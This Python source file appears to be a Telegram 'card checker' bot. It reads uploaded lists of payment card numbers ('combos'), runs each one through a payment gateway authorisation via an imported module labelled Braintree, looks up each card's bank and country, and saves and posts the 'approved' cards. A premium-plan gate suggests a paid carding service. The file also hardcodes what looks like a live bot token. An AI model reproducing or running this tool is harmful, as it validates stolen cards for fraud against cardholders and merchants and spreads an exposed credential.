import requests
import re
import os
from hh import keep_alive

try:
    import telebot
except ImportError:
    os.system("pip install pyTelegramBotAPI")
    import telebot

from telebot import types
from GATEAU import Tele
from colorama import Fore

allowed_ids = [5344482379]
sto = {"stop": True}
token = "6447427931:AAEmUkSUZJKGixxl378yjmCyzA4WTE2PhXQ"
bot = telebot.TeleBot(token, parse_mode="HTML")

@bot.message_handler(commands=["stop"])
def stop(message):
    sto.update({"stop": True})
    bot.reply_to(message, 'I stopped the combo for you, with your permission. Wait 10s')

@bot.message_handler(commands=["start"])
def start(message):
    bot.send_message(message.chat.id, "Send your combo txt file now", reply_markup=types.InlineKeyboardMarkup())

@bot.message_handler(content_types=["document"])
def main(message):
    first_name = message.from_user.first_name
    name = f"{first_name} "
    risk = 0
    bad = 0
    ok = 0

    ko = bot.reply_to(message, f"WELCOME {name} NOW I WILL BE CHECKING YOUR CARDS").message_id
    file_info = bot.get_file(message.document.file_id)
    ee = bot.download_file(file_info.file_path)
    
    with open("combo.txt", "wb") as w:
        w.write(ee)

    print(message.chat.id)
    sto.update({"stop": False})

    if message.chat.id in allowed_ids:
        with open("combo.txt") as file:
            lines = file.readlines()
            lines = [line.rstrip() for line in lines]
            total = len(lines)

            for cc in lines:
                if sto["stop"]:
                    break

                bin_number = cc[:6]
                url = f"https://lookup.binlist.net/{bin_number}"
                try:
                    req = requests.get(url).json()
                except Exception as e:
                    print(f"Error fetching data for BIN {bin_number}: {e}")
                    continue

                try:
                    inf = req['scheme']
                except KeyError:
                    inf = "------------"

                try:
                    card_type = req['type']
                except KeyError:
                    card_type = "-----------"

                try:
                    brand = req['brand']
                except KeyError:
                    brand = '-----'

                info = f"{inf}-{card_type}-{brand}".upper()

                try:
                    bank = req['bank']['name'].upper()
                except KeyError:
                    bank = "CAPITAL ONE"

                try:
                    country = f"{req['country']['name']} {req['country']['emoji'].upper()}"
                except KeyError:
                    country = "-----------"

                mes = types.InlineKeyboardMarkup(row_width=1)
                mes.add(
                    types.InlineKeyboardButton(f"• {cc} •", callback_data='u8'),
                    types.InlineKeyboardButton(f"• Approved ✅ : [ {ok} ] •", callback_data='u2'),
                    types.InlineKeyboardButton(f"• Declined ❌  : [ {bad} ] •", callback_data='u1'),
                    types.InlineKeyboardButton(f"• Risk 🥲  : [ {risk} ] •", callback_data='u1'),
                    types.InlineKeyboardButton(f"• Total   : [ {total} ] •", callback_data='u1')
                )

                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text=f'''𓆩 Premium 𓆪 {name}, checking your card...⌛💸''',
                    parse_mode='markdown',
                    reply_markup=mes
                )

                try:
                    last = str(Tele(cc))
                except Exception as e:
                    print(f"Error checking card {cc}: {e}")
                    continue

                if "risk" in last:
                    risk += 1
                    print(Fore.YELLOW + cc + "->" + Fore.CYAN + last)
                elif "Insufficient Funds" in last:
                    ok += 1
                    respo = f'''
Approved ✅
──────────────────
[↯] CC ★ {cc}
[↯] Gateway ★ 𓆩𝐁𝐫𝐚𝐢𝐧𝐭𝐫𝐞𝐞𓆪ꪾ Auth
[↯] Response ★ Approved
──────────────────
[↯] BIN Info: {info}
[↯] Bank: {bank}
[↯] Country: {country}
──────────────────
[↯] BOT BY: @Frr
[↯] PROXY : Live [1XX.XX.XX 🟢]
──────────────────
'''
                    print(Fore.YELLOW + cc + "->" + Fore.GREEN + last)
                    bot.reply_to(message, respo)
                    with open("hit.txt", "a") as f:
                        f.write(respo)
                else:
                    bad += 1
                    print(Fore.YELLOW + cc + "->" + Fore.RED + last)
            if sto["stop"]:
                bot.reply_to(message, 'Process stopped.')
    else:
        bot.reply_to(message, "You're not a premium user. Please buy a premium plan.")

keep_alive()
print("STARTED BOT @Naughtyxd")
bot.infinity_polling()
